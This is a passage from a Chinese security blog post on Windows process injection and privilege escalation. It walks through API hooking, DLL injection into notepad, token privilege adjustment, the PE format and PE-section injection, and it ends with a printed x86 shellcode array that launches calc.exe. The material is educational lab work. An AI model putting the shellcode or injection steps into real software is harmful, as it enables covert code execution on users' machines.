<h3 id="hook实践"><a class="header-anchor" href="#hook实践">¶</a>hook实践</h3>
<p>这里看到响应函数，更改为如下:</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>弹出计算器可能效果更加直观。</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>进程名字改为notepad++.exe，然后使用g++编译代码。</p>
<p><code> g++ --share ai.cpp -o ai.dll</code></p>
<p>编译完毕之后，把dll和exe放在一个目录下，然后运行exe</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" srcset="/img/loading.gif" lazyload alt="jeNzFS.jpg"></a></p>
<p>hook成功</p>
<h3 id="dll实践"><a class="header-anchor" href="#dll实践">¶</a>dll实践</h3>
<p>同样的方式，编译代码，注意修改，使得可以弹出计算器。</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>但是这边编译代码的时候出了很多问题，于是把_tprintf全部替换成了printf，且所有字符串去掉了L前缀。</p>
<p>按道理来讲_tprintf不应该报错才对。</p>
<p>之后打开notepad 查看一下进程号。</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>运行册程序注入dll。改一下代码</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>成功弹出计算器。</p>
<h2 id="0x04-dll注入实现提权"><a class="header-anchor" href="#0x04-dll注入实现提权">¶</a>0x04 dll注入实现提权</h2>
<p>前面看dll注入代码的时候，有一个提权函数。这里分析一下</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>首先打开当前进程的令牌，存储在hToken中。</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>查看目标权限的上下文，存储到luid中。</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>用新建的tp对象替换原来的进程令牌实现权限的变化。</p>
<h2 id="0x05-PE注入"><a class="header-anchor" href="#0x05-PE注入">¶</a>0x05 PE注入</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p>
<p>该文章对PE结构讲解十分详细。</p>
<p>PE（ Portable Execute）文件是Windows下可执行文件的总称，常见的有 <strong>DLL，EXE，OCX，SYS</strong> 等。它是微软在 UNIX 平台的 COFF（通用对象文件格式）基础上制作而成。<strong>最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下</strong>。<strong>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)</strong>。</p>
<p>PE文件的格式如下</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>PE文件加载的过程如下：</p>
<ul>
<li>检查Dos header里面的PE header偏移，然后直接跳转到header</li>
<li>检查header是否合法，如果合法则跳转到header的尾部</li>
<li>header的尾部是节表，此时PE装载器会读取节表的信息，然后映射内存（虚存相关，操作系统讲过）</li>
<li>映射完毕之后，开始处理输入表的逻辑部分</li>
</ul>
<p>注意到文件中的节表和节</p>
<p><strong>节表</strong>：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</p>
<p><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个</p>
<p>**导出表 <strong>是 用来描述 模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress函数就能动态获取到函数的地址。</strong></p>
<p><strong>导入表</strong> 在 PE 文件加载时，会根据这个表里的内容加载依赖的 DLL ( 模块 )，并填充所需函数的地址。</p>
<h3 id="注入思路"><a class="header-anchor" href="#注入思路">¶</a>注入思路</h3>
<p>首先了解，PE文件中导入的dll信息以结构体的形式存储在IDT中。只要将dll添加到列表尾部就可以。<strong>IMAGE_OPPTIONAL_HEADER结构体中导入表RVA即是IDT的RVA。如果内存不够，就移动IDT。</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDT结构解析</p>
<p>注入的手段一半有两种：</p>
<ul>
<li>寻找最大的代码空白，cave mine，将 shellcode 写入 cave 中。这种方式比较方便，缺点是只适合较小的  shellcode，windows 上的 shellcode 要比 linux 上的 shellcode 大许多，这种方式的泛用性不高。</li>
<li>新增 PE 节，这种方式修改 PE 文件的节头表和节，可以插入任意大小的 shellcode。</li>
</ul>
<p>PE 文件注入主要包括两个方面：</p>
<ul>
<li>编写 shellcode</li>
<li>注入 shellcode</li>
</ul>
<p>注入 shellcode 相对比较简单，下面介绍新增 PE 节实现 PE 注入的方法。</p>
<h3 id="注入实现"><a class="header-anchor" href="#注入实现">¶</a>注入实现</h3>
<p>思路大都是添加节之类的，这里自己没有实现，找了两个项目。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> 这个是注入pe的项目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> 这个很强，转化pe为shellcode</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> 这是pe_to_shellcode的解析</p>
<p>pe_to_shellcode这个东西得看代码才能懂。</p>
<p>演示一下第一个注入项目。</p>
<p>手动编译了一个32位的项目</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>然后利用github项目中的exe，执行注入，注入的代码是弹出一个messagebox</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>运行badpe</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>点击确定之后会政策执行代码。弹计算器只需要把改代码替换为下面的shellcode即可。</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> 
<span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span>
<span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span>
<span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span>
<span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span>
<span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span>
<span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span>
<span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span>
<span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span>
<span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span>
<span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span>
<span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span>
<span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span>
<span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span>
<span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span>
<span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span>
<span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span>
<span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span>
<span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span>
<span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span>
<span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span>
<span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span>
<span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span>
<span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span>
<span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span>
<span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/others/" class="category-chain-item">others</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/windows%E6%8F%90%E6%9D%83/">#windows提权</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>从进程注入到提权</div>
      <div>http://example.com/2022/06/26/进程注入详解/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Epiphany</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年6月26日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/" title="CVE-2021-0277从漏洞报告到poc编写">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-0277从漏洞报告到poc编写</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/" title="好怀百岁几回开">
                        <span class="hidden-mobile">好怀百岁几回开</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"QC4vvYPEM2BYGMlNkxfbdllW-gzGzoHsz","appKey":"nsnNub648pvsc3yts6pFQY1A","path":"window.location.pathname","placeholder":"留言叭","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://qc4vvype.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">载入网站运行时间...</span> <script src="/js/duration.js"></script> </div>   
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script  src="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>

  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="/js/leancloud.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
